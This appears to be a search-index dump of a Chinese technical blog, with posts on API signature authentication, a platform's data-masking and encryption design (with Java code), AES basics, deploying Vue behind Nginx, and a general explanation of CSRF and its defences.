客户端准备请求：客户端构建API请求，并收集所有必要的参数，如请求方法、URL、时间戳、身份凭证等。 参数排序：将请求参数按照一定的规则进行排序，通常是按参数名称的字母顺序进行排序。 生成待签名字符串：将排序后的参数按照一定的格式拼接成一个待签名的字符串。 添加密钥：将密钥（一般是客户端的私钥）加入待签名字符串中。 计算签名：使用特定的加密算法（如HMAC-SHA1、HMAC-SHA256等）对待签名字符串进行加密，生成签名。 发送请求：将生成的签名添加到API请求中的特定位置（如请求头或请求参数）。 服务器端验证签名：服务器端收到请求后，会使用相同的算法和密钥对接收到的参数进行签名计算。然后将服务器端计算得到的签名与请求中的签名进行比对，如果一致，则验证通过；否则，验证失败。 某系统实现方案 第三方系统产生随机会话密钥randomKey, 通过randomKey和加密策略将请求body参数加密，放在字段encryptData中，同时将会话密钥randomKey通过平台公钥RSA加密，放入字段dgtlEnvlp中； 第三方系统通过SHA256将随机数，时间戳及请求body报文加签后发送给OpenAPI； OpenAPI通过openApiSign(SecretKey)验证后，获取代理用户，第三方应用ID及数据中心，再验证签名，此时会检查随机数、时间戳以及请求参数的合法性和有效性； 签名验证通过后，解密并还原数据，进行下一步业务处理，如查询或保存数据； OpenAPI产生随机数，加密返回结果数据； OpenAPI对返回结果数据进行SHA256签名； 第三方系统接收到返回结果进行验证签名； 第三方系统解密返回的结果，进行相关业务处理。 ","date":"2025-06-05","objectID":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/:4:1","tags":[],"title":"kd-OpenAPI-API请求的身份鉴权","uri":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/"},{"categories":["Java后端"],"content":"产品概述 ","date":"2025-06-05","objectID":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/:1:0","tags":["数据加密"],"title":"kd-隐私中心-数据脱敏与数据加密","uri":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"},{"categories":["Java后端"],"content":"产品介绍 《中华人民共和国个人信息保护法》自2021年11月1日起施行，需要针对软件中涉及个人隐私的数据进行脱敏处理，确保产品符合国家个保法规。 苍穹业务产品包含大量隐私数据，从数据安全管理周期来看，需要对数据从存储、查询、显示、匿名化（退出）等阶段涉及到的敏感数据进行加密、脱敏等处理，业务产品单独处理会面临管控难度大、开发成本大、灵活度差等问题。 ","date":"2025-06-05","objectID":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/:1:1","tags":["数据加密"],"title":"kd-隐私中心-数据脱敏与数据加密","uri":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"},{"categories":["Java后端"],"content":"产品结构图 ","date":"2025-06-05","objectID":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/:1:2","tags":["数据加密"],"title":"kd-隐私中心-数据脱敏与数据加密","uri":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"},{"categories":["Java后端"],"content":"名词解释 名词 说明 数据脱敏 数据脱敏（Data Masking），顾名思义，是屏蔽敏感数据，对某些敏感信息（比如，身份证号、手机号、卡号、客户姓名、客户地址、邮箱地址、薪资等等 ）通过脱敏规则进行数据的变形，实现隐私数据的可靠保护。业界常见的脱敏规则有，替换、重排、加密、截断、掩码。 数据加密 数据加密，是利用密码技术对信息进行加密，实现信息隐蔽，从而起到保护信息的安全的作用。 ","date":"2025-06-05","objectID":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/:1:3","tags":["数据加密"],"title":"kd-隐私中心-数据脱敏与数据加密","uri":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"},{"categories":["Java后端"],"content":"功能清单 功能 说明 备注 数据安全标签 为了更好的管理安全隐私数据，而对业务对象的字段进行的标签化管理，一般常用的数据安全标签可分为个人隐私数据、个人敏感数据等等。 一般按照应用或者数据安全领域隔离，方便隐私方案统一设置 隐私方案配置 为数据安全标签中各字段设置具体的加密方式、脱敏策略、权限控制以及解密控制，隐私方案在运行期设置，在运行期立即生效。 可能触发历史数据加密迁移 数据处理 对后台异步加密任务的处理情况进行实时监控。 全局控制 对隐私方案进行的全局设置。 全局参数控制脱敏与加密 加密方案 提供对加密算法和密钥的统一管理和配置能力。 流程图如下： 数据安全标签 数据安全标签是为更好的管理安全隐私数据，而对业务对象的字段进行的标签化管理。一般常用的隐私标签可分为个人隐私数据、个人敏感数据等等，在配置隐私方案前必须先维护数据标签。 注意事项 （1）安全数据标签已经被隐私方案引用，则不能删除安全数据标签。 （2）标签中的字段已经被隐私方案引用并且字段已经设置加密或脱敏规则，则不能删除该字段。 （3）同一个字段只能被一个标签引用。 隐私方案 隐私方案能够为数据安全标签中各字段设置具体的加密方式、脱敏策略、权限控制以及解密控制。隐私方案在运行期设置，在运行期立即生效。 注意事项 （1）数据安全标签不能被多个隐私方案引用。 （2）隐私方案如果已经存在加密的数据是不允许删除的。 （3）如果隐私方案正在做加解密处理的字段，状态设置为发布中，无法对方案进行修改。 （4）多个字段使用了一个相同物理表，此时如果一个字段已经配置加密方案，则其他字段的加密方案按照物理表的字段已配置的加密方案默认填充。 （5）当字段需要进行加密处理，存在历史数据迁移情况，会提示产生新的数据处理任务。 （6）当修改字段的加密方式，存在历史数据从加密方式替换的情况，会提示产生新的数据处理任务。 数据处理 在我们对数据进行加密时，一般会遇到三种操作场景：1、字段加密；2、算法替换；3、秘钥替换；此时系统会对数据库中数据进行数据加密或者数据解密、再加密这些复杂的工序，为了保证系统的稳定，平台将此复杂的数据处理工序做成后台异步任务，并且支持实时监控任务处理情况。 注意事项 （1）任务状态为进行中时相应的实体单据将锁定，无法访问。 （2）数据完成加密迁移后，系统会自动生成一个加密数据表存放加密数据，表名为：原表名_py。加密完成后，原表的明文数据会清空。 加密方案 对于算法以及密钥的管理，在不同场景有者不同需求，有些场景需要有独立的加密算法与密钥（如HR薪资模块期望有自己独立的加密算法与密钥），有些场景会定期更换密钥，所以隐私中心提供了统一的加密方案配置功能。 注意事项 （1）使用状态将控制隐私方案中可选择的加密方式，禁用已经被引用的加密方案，不影响现有数据的加密方案。 （2）加密算法平台默认支持AES 128和SM4 128，可以自定义扩展其他加密算法。 （3）在自定义加密算法时，平台JDK版本支持128位，所以您扩展的更多位数的加密算法可能在加密方案中选择不到，这时您需要升级JDK或者在当前版本替换相应的JAR包。 脱敏权限 在日常业务中，由于不同岗位的权限范围有所不同，因此对于数据的脱敏展示也需要根据权限来进行划分。如付款业务中，出于个人隐私考虑，流程相关人员是不允许查看申请人的银行账号的，但在付款时，出纳人员是可以查看银行账号的。对于这样场景，我们就需要我们的脱敏控制支持按人员、按角色进行脱敏权限的设置。目前版本仅支持按人员设置脱敏权限。 注意事项 （1）权限控制作用于表单、导出、打印。列表中如果开启权限控制，列字段固定为脱敏状态，无论是否配置授权人都不可显示出明文。 脱敏规则 对于数据脱敏已经提供预置几种脱敏方式，比如身份证，姓名，电话号码的通用规则，而面对不同的业务场景仍然有特殊规则要求难以满足，因此为了提升隐私中心功能能力，为实施开发人员，提供自定义脱敏规则功能。 ","date":"2025-06-05","objectID":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/:1:4","tags":["数据加密"],"title":"kd-隐私中心-数据脱敏与数据加密","uri":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"},{"categories":["Java后端"],"content":"数据脱敏 ","date":"2025-06-05","objectID":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/:2:0","tags":["数据加密"],"title":"kd-隐私中心-数据脱敏与数据加密","uri":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"},{"categories":["Java后端"],"content":"数据处理流程 public class DesensitizeStrategyFactory { private static final Log log = LogFactory.getLog(\"DesensitizeStrategyFactory\"); private static Map\u003cString, IDesensitizeStrategy\u003e defaultMap = new ConcurrentHashMap\u003c\u003e(8); private static final String PRIVACY_DESENSITIZE_STRATEGY_REGION = \"PRIVACY_DESENSITIZE_STRATEGY_REGION\"; static { initDefaultStrategy(); } private static void initDefaultStrategy() { register(new LengthDesenStrategy()); register(new HeadTailDesenStrategy()); register(new FixLengthDesenStrategy()); register(new TelephoneDesenStrategy()); register(new NameDesenStrategy()); register(new IdCardDesenStrategy()); register(new BankAcctDesenStrategy()); } /** * 从数据表加载 */ private static void initDB() { //加载所有的脱敏方案至内存 List\u003cString\u003e numberList = new ArrayList\u003c\u003e(10); try (DataSet dataSet = QueryServiceHelper.queryDataSet(\"loadDesensitizationRules\", \"privacy_desen_rules\", \"id,number,ruletype,matchrules,replacement\", new QFilter[]{new QFilter(\"number\", QCP.not_equals, \"NO\")}, null)) { Map\u003cString, IDesensitizeStrategy\u003e strategyMap = new HashMap\u003c\u003e(16); while (dataSet.hasNext()) { Row data = dataSet.next(); String number = data.getString(\"number\"); IDesensitizeStrategy strategy = defaultMap.get(number); if (strategy == null \u0026\u0026 IPrivacyConst.GLOBAL.DESENSITIZATION_RULE_REGULAR.equals(data.getString(\"ruletype\"))) { //如果正则表达式， 则将当前脱敏策略加载到内存中 strategy = new RegularDesenStrategy(data.getString(\"matchrules\"), data.getString(\"replacement\")); numberList.add(number); } //脱敏策略的值可能为number或id，需要把初始脱敏策略也用id设置到内存中，否则会找不到策略 strategyMap.put(data.getString(\"id\"), strategy); } getLocalCache().put(\"allDesensitizationRules\", strategyMap); } log.info(\"kd.bos.privacy.service.DesensitizeStrategyFactory.initDB(), data={}\", numberList); } /** * 重新加载脱敏规则 */ public static void reload() { getLocalCache().clear(); log.info(\"kd.bos.privacy.service.DesensitizeStrategyFactory.reload()\"); initDB(); } public static void register(IDesensitizeStrategy strategy) { defaultMap.put(strategy.getStrategyName()","date":"2025-06-05","objectID":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/:2:1","tags":["数据加密"],"title":"kd-隐私中心-数据脱敏与数据加密","uri":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"},{"categories":["Java后端"],"content":"脱敏规则 本质上是一个正则表达式 ","date":"2025-06-05","objectID":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/:2:2","tags":["数据加密"],"title":"kd-隐私中心-数据脱敏与数据加密","uri":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"},{"categories":["Java后端"],"content":"数据加密 ","date":"2025-06-05","objectID":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/:3:0","tags":["数据加密"],"title":"kd-隐私中心-数据脱敏与数据加密","uri":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"},{"categories":["Java后端"],"content":"设计模式 在运行时元数据上，将需要加密的字段的属性转换为隐私属性，并设置对应的隐私服务实现，在数据查询和保存阶段，通过对应数据的隐私实现加密或者解密数据。 ","date":"2025-06-05","objectID":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/:3:1","tags":["数据加密"],"title":"kd-隐私中心-数据脱敏与数据加密","uri":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"},{"categories":["Java后端"],"content":"数据处理流程 数据查询入口 BusinessDataServiceHelper public Object[] read(ReadWhere where) { assert where != null; // 读取数据到表模型上 QuickDataSet dataSet = readToDataSet(this.getDatabase(), this.getDataEntityTypeMap().getDbTable(), where); // 表模型转化为对象模型 Object[] entities = dataSetToEntities(dataSet); privacyDataToEntities(entities, this.getDataEntityTypeMap()); handlePrivacyDataEntities(entities, this.getDataEntityTypeMap()); // 填充实体的快照数据 SetEntitySnapshot(entities, dataSet); return entities; } privacyDataToEntities 处理数据解密 private void privacyDataToEntities(Object[] dataEntities, DataEntityTypeMap dataEntityTypeMap) { IDataEntityType dt = dataEntityTypeMap.getDataEntityType(); for (ComplexPropertyMap cpxPropMap : dataEntityTypeMap.getComplexProperties()) { List\u003cObject\u003e list = new ArrayList\u003c\u003e(16); IDataEntityProperty cpxPropType = cpxPropMap.getDataEntityProperty(); for (Object obj : dataEntities) { list.add(cpxPropType.getValue(obj)); } privacyDataToEntities(list.toArray(new Object[list.size()]), cpxPropMap.getComplexPropertyTypeMap()); } for (CollectionPropertyMap colPropMap : dataEntityTypeMap.getCollectionProperties()) { ICollectionProperty colp = colPropMap.getDataEntityProperty(); for (Object obj : dataEntities) { List\u003c?\u003e list = (List\u003c?\u003e) colp.getValue(obj); privacyDataToEntities(list.toArray(new Object[list.size()]), colPropMap.getCollectionItemPropertyTypeMap()); } } List\u003cIPrivacyProperty\u003e privacyProperties = new ArrayList\u003c\u003e(16); for (SimplePropertyMap splMap : dataEntityTypeMap.getSimpleProperties()) { // 具体的隐私属性应该是在某个位置设置过 IDataEntityProperty sp = splMap.getDataEntityProperty(); if (sp instanceof IPrivacyProperty) { privacyProperties.add((IPrivacyProperty) sp); } } DataEntityPropertyCollection properties = dt.getProperties(); Map\u003cString, IDataEntityProperty\u003e simpleProperties = new HashMap\u003c\u003e(16); for (IDataEntityProperty prop : properties) { if (prop instanceof ISimpleProperty) { simpleProperties.put(prop.getName(), prop); } } // 该实体类对应的所有隐私属性 for (IPrivacyProperty privacyPro","date":"2025-06-05","objectID":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/:3:2","tags":["数据加密"],"title":"kd-隐私中心-数据脱敏与数据加密","uri":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"},{"categories":["Java后端"],"content":"加密算法 ​ 分组加密（英语：Block cipher），又称分块加密或块密码，是一种对称密钥算法。它将明文分成多个等长的模块（block），使用确定的算法和对称密钥对每组分别加密解密。 ​ 对称加密、加密算法主要可以分为两种，一个是非对称加密算法，另一个就是对称加密算法。对称加密简单来说就是有一个明文，通过一个密钥加密之后得到一个密文，这个密文可以通过相同的密要解密得出和原来相同的明文 AES-256 AES（Advanced Encryption Standard）是一种对称加密算法，它在密码学中被广泛应用。AES取代了原先的DES（Data Encryption Standard），成为新一代的加密标准。AES算法使用相同的密钥来进行加密和解密，因此被称为对称加密算法。它采用了替代和混淆的技术，通过对输入数据进行一系列的变换和代换，最终得到加密后的输出。 工作原理 SubBytes 在SubBytes阶段，AES算法使用一个固定的S盒（Substitution Box），将输入的每一个字节替换成另一个字节。S盒中的每一个字节都经过了一系列的代换和混淆操作，使得替换后的输出具有非线性和随机性。 ShiftRows ShiftRows阶段对输入的状态矩阵进行行移位操作。每一行都向左移动不同的位数，这样可以增加算法的混淆度，使得密文更加难以分析和破解。 MixColumns MixColumns阶段对状态矩阵中的列进行混淆操作。这个步骤涉及到一系列的线性变换，使得输入数据更加分散和随机，增加了算法的安全性。 AddRoundKey AddRoundKey阶段将轮密钥和当前状态矩阵进行按位异或操作。每一轮的轮密钥都是从主密钥中生成的，通过对轮密钥和状态矩阵进行异或操作，实现了密钥的混淆和扩散。 应用场景 AES算法在各个领域都有广泛的应用，包括但不限于： 数据加密: AES被广泛应用于保护敏感数据的加密，如个人信息、银行数据、密码等。 网络通信: 在网络通信中，AES用于加密数据传输，保护通信内容不被窃听或篡改。 存储加密: AES可以用于对存储在磁盘或数据库中的数据进行加密，以防止未经授权的访问。 在Java中使用AES 在Java中，可以使用Cipher类来执行AES加密和解密操作。以下是一个简单的示例代码： import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; import java.util.Base64; public class AESEncryption { public static void main(String[] args) throws Exception { String originalText = \"Hello, AES!\"; String key = \"0123456789abcdef\"; // 密钥长度必须为16字节（128位）、24字节（192位）或32字节（256位） // 加密数据 byte[] encryptedBytes = encrypt(originalText, key); System.out.println(\"Encrypted: \" + Base64.getEncoder().encodeToString(encryptedBytes)); // 解密数据 String decryptedText = decrypt(encryptedBytes, key); System.out.println(\"Decrypted: \" + decryptedText); } // 加密方法 private static byte[] encrypt(String originalText, String key) throws Exception { SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), \"AES\"); Cipher cipher = Cipher.getInstance(\"AES\"); cipher.init(Cipher.ENCRYPT_MODE, secretKey); return cipher.doFinal(originalText.getBytes()); } // 解密方法 private static String decrypt(byte[] encryptedBytes, String key) throws Exception { SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), \"AES\"); Cipher cipher = ","date":"2025-06-05","objectID":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/:3:3","tags":["数据加密"],"title":"kd-隐私中心-数据脱敏与数据加密","uri":"/posts/kd-%E9%9A%90%E7%A7%81%E4%B8%AD%E5%BF%83-%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86/"},{"categories":["运维"],"content":"前端部署","date":"2025-06-03","objectID":"/posts/%E5%A6%82%E4%BD%95%E6%8A%8Avue%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8admin%E8%B7%AF%E5%BE%84%E4%B8%8B%E5%89%8D%E7%AB%AF%E8%AE%BF%E9%97%AE/","tags":["vue部署"],"title":"如何把vue项目部署在admin路径下前端访问","uri":"/posts/%E5%A6%82%E4%BD%95%E6%8A%8Avue%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8admin%E8%B7%AF%E5%BE%84%E4%B8%8B%E5%89%8D%E7%AB%AF%E8%AE%BF%E9%97%AE/"},{"categories":["运维"],"content":"部署一个vue项目通过/根路径访问 ","date":"2025-06-03","objectID":"/posts/%E5%A6%82%E4%BD%95%E6%8A%8Avue%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8admin%E8%B7%AF%E5%BE%84%E4%B8%8B%E5%89%8D%E7%AB%AF%E8%AE%BF%E9%97%AE/:1:0","tags":["vue部署"],"title":"如何把vue项目部署在admin路径下前端访问","uri":"/posts/%E5%A6%82%E4%BD%95%E6%8A%8Avue%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8admin%E8%B7%AF%E5%BE%84%E4%B8%8B%E5%89%8D%E7%AB%AF%E8%AE%BF%E9%97%AE/"},{"categories":["运维"],"content":"前端项目配置 ‌修改publicPath 在vue.config.js中设置基础路径为/admin/（对应部署路径）： module.exports = { publicPath: process.env.NODE_ENV === 'production' ? '/' : '/' }; 配置路由基础路径‌ 在src/router/index.js中设置base属性： const router = new VueRouter({ mode: 'history', base: process.env.BASE_URL, // 确保与publicPath一致 如果是根路径， 可以去掉该属性 }); 构建项目 npm run build # 或 yarn build ","date":"2025-06-03","objectID":"/posts/%E5%A6%82%E4%BD%95%E6%8A%8Avue%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8admin%E8%B7%AF%E5%BE%84%E4%B8%8B%E5%89%8D%E7%AB%AF%E8%AE%BF%E9%97%AE/:1:1","tags":["vue部署"],"title":"如何把vue项目部署在admin路径下前端访问","uri":"/posts/%E5%A6%82%E4%BD%95%E6%8A%8Avue%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8admin%E8%B7%AF%E5%BE%84%E4%B8%8B%E5%89%8D%E7%AB%AF%E8%AE%BF%E9%97%AE/"},{"categories":["运维"],"content":"服务器部署 配置Nginx server { listen 80; server_name localhost; location / { root /home/ruoyi/projects/ruoyi/; # 该目录为上传dist的目录 try_files $uri $uri/ /index.html; index index.html index.htm; } location /prod-api/{ proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://ruoyi-admin-single:8081/; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } ","date":"2025-06-03","objectID":"/posts/%E5%A6%82%E4%BD%95%E6%8A%8Avue%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8admin%E8%B7%AF%E5%BE%84%E4%B8%8B%E5%89%8D%E7%AB%AF%E8%AE%BF%E9%97%AE/:1:2","tags":["vue部署"],"title":"如何把vue项目部署在admin路径下前端访问","uri":"/posts/%E5%A6%82%E4%BD%95%E6%8A%8Avue%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8admin%E8%B7%AF%E5%BE%84%E4%B8%8B%E5%89%8D%E7%AB%AF%E8%AE%BF%E9%97%AE/"},{"categories":["运维"],"content":"部署一个vue项目通过子路径/admin访问 ","date":"2025-06-03","objectID":"/posts/%E5%A6%82%E4%BD%95%E6%8A%8Avue%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8admin%E8%B7%AF%E5%BE%84%E4%B8%8B%E5%89%8D%E7%AB%AF%E8%AE%BF%E9%97%AE/:2:0","tags":["vue部署"],"title":"如何把vue项目部署在admin路径下前端访问","uri":"/posts/%E5%A6%82%E4%BD%95%E6%8A%8Avue%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8admin%E8%B7%AF%E5%BE%84%E4%B8%8B%E5%89%8D%E7%AB%AF%E8%AE%BF%E9%97%AE/"},{"categories":["运维"],"content":"前端项目配置 ‌修改publicPath 在vue.config.js中设置基础路径为/admin/（对应部署路径）： module.exports = { publicPath: process.env.NODE_ENV === 'production' ? '/admin/' : '/' }; 配置路由基础路径‌ 在src/router/index.js中设置base属性： const router = new VueRouter({ mode: 'history', base: process.env.BASE_URL, // 确保与publicPath一致 }); 构建项目 npm run build # 或 yarn build ","date":"2025-06-03","objectID":"/posts/%E5%A6%82%E4%BD%95%E6%8A%8Avue%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8admin%E8%B7%AF%E5%BE%84%E4%B8%8B%E5%89%8D%E7%AB%AF%E8%AE%BF%E9%97%AE/:2:1","tags":["vue部署"],"title":"如何把vue项目部署在admin路径下前端访问","uri":"/posts/%E5%A6%82%E4%BD%95%E6%8A%8Avue%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8admin%E8%B7%AF%E5%BE%84%E4%B8%8B%E5%89%8D%E7%AB%AF%E8%AE%BF%E9%97%AE/"},{"categories":["运维"],"content":"服务器部署 配置Nginx server { listen 9090; server_name localhost; # 配置/admin路径指向打包后的项目 location /admin/ { alias /home/ruoyi/projects/admin/; # 上传的dist重命名后的目录 try_files $uri $uri/ /admin/index.html; # 解决history模式刷新404 !!!!!非常重要 index index.html index.htm; } location /prod-api/{ proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://ruoyi-admin-single:8081/; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } ","date":"2025-06-03","objectID":"/posts/%E5%A6%82%E4%BD%95%E6%8A%8Avue%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8admin%E8%B7%AF%E5%BE%84%E4%B8%8B%E5%89%8D%E7%AB%AF%E8%AE%BF%E9%97%AE/:2:2","tags":["vue部署"],"title":"如何把vue项目部署在admin路径下前端访问","uri":"/posts/%E5%A6%82%E4%BD%95%E6%8A%8Avue%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2%E5%9C%A8admin%E8%B7%AF%E5%BE%84%E4%B8%8B%E5%89%8D%E7%AB%AF%E8%AE%BF%E9%97%AE/"},{"categories":["网络安全"],"content":"跨站请求伪造 跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种网络攻击方式，它利用用户已经在某个网站进行过认证的身份，通过伪造请求来执行未经用户授权的操作。攻击者通过欺骗用户，使其在不知情的情况下执行某些敏感操作，例如修改密码、发表言论、转账等。 CSRF攻击的核心在于攻击者能够构造恶意请求，并引导用户在受害者已经登录的情况下访问包含恶意请求的页面。一旦用户点击了这个页面上的触发请求的按钮或链接，浏览器会自动携带受害者的认证信息发送请求，从而实现攻击者预期的操作。 ","date":"2025-05-28","objectID":"/posts/csrf-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/:1:0","tags":["kali"],"title":"CSRF-跨站请求伪造","uri":"/posts/csrf-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"},{"categories":["网络安全"],"content":"防范措施 为了防范CSRF攻击，开发者可以采取以下措施： 同源策略（Same Origin Policy） 浏览器的同源策略限制了一个页面只能请求同一域下的资源，从而减少了CSRF攻击的可能性。攻击者通常难以伪造出同一域的请求。 Anti-CSRF Token 在用户登录时生成一个唯一的令牌（CSRF Token），将其嵌入到每个表单或请求中。服务器在接收到请求时验证令牌的有效性，如果令牌不匹配，则拒绝该请求。这样即使攻击者伪造请求，也无法获取有效的CSRF Token。 Cookie设置 在Cookie中使用SameSite属性，限制第三方站点对Cookie的访问。设置为Strict或Lax可以在一定程度上减弱CSRF攻击。 双重提交Cookie 将CSRF Token不仅存储在Cookie中，还通过表单的隐藏字段等方式在请求中传递，以增加令牌的安全性。 检查Refere 服务器可以检查请求的Referer头部，但这并不是绝对可靠的防御手段，因为Referer头部有时会被浏览器省略或伪造。 通过综合使用这些防御措施，开发者可以大大提高系统对CSRF攻击的抵抗能力。 ","date":"2025-05-28","objectID":"/posts/csrf-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/:1:1","tags":["kali"],"title":"CSRF-跨站请求伪造","uri":"/posts/csrf-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"},{"categories":["网络安全"],"content":"POC POC是“Proof of Concept”的缩写，指的是概念验证或概念证明。在计算机安全领域，POC通常指的是一个漏洞利用的实际示例，用来证明该漏洞确实存在，并且可以被利用。POC可以是一个简单的代码片段、一个演示页面、一个脚本或者一个程序，其目的是演示特定漏洞的影响或者危害性。 